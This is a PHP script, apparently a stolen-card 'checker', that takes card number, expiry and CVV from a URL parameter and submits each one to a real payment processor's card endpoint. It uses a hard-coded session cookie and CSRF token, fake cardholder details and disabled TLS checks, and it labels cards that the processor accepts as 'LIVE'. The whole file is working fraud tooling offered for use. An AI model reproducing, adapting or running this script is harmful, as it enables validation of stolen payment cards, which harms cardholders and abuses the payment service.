<?php
    error_reporting(0);

    lovebug();

    function lovebug() {
        $lamao = start();
        response($lamao[0], $lamao[1], $lamao[2], $lamao[3], $lamao[4]);
    }

    function response($httpcode, $respo, $code, $lista, $took){

        if ($httpcode == 201) {

            echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Authorized</span></td></tr><br>';

        } else {

            echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$code.': '.$respo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.$took.' seconds</span></td> </tr><br>';

        }
    }

    function start() {

        $time_start = microtime(true);
        extract($_GET);
        $separator = explode("|", $lista);
        $cc = $separator[0];
        $mm = $separator[1];
        $yy = $separator[2];
        $cvv = $separator[3];
        
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => 'https://pay.ccbill.com/paymentMethods',
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_POST => 1,
            CURLOPT_HTTPHEADER => array(
                'Accept: application/json, text/plain, */*',
                'Content-Type: application/json;charset=UTF-8',
                'Cookie: SESSION=d4993d67-38a3-4afb-975e-7d8845e48985; _ga=GA1.2.1555022726.1615544702; _gid=GA1.2.2060948105.1615544702',
                'Origin: https://pay.ccbill.com',
                'Referer: https://pay.ccbill.com/',
                'X-CSRF-TOKEN: 22c1f3d5-204d-4c5a-a799-3bcb6eef1a34',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36'
            ),
            CURLOPT_POSTFIELDS => '{"type":"card","countryAbbr":"US","accountType":null,"cardNumber":"'.$cc.'","expiryMonth":"'.$mm.'","expiryYear":'.$yy.',"cvv":'.$cvv.',"firstName":"Ragnar","lastName":"Magnusson","address":"'.RandomString().'","city":"Hayward","provinceAbbr":"CA","postalCode":"94545","phoneNumber":"6508730751","accountNumber":null,"reEnterAccountNumber":null,"routingNumber":null}'
        ));
        $execute = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $respo = GetStr($execute, '"generalMessage":"The account information entered ', ' and ');
        $errCode = GetStr($execute, ',"errorCode":"', '"');
        $took = number_format(microtime(true) - $time_start, 2);

        if($errCode == 100007)
            lovebug();
        else
            return [$httpCode, $respo, $errCode, $lista, $took];
    }

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7) {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
?>
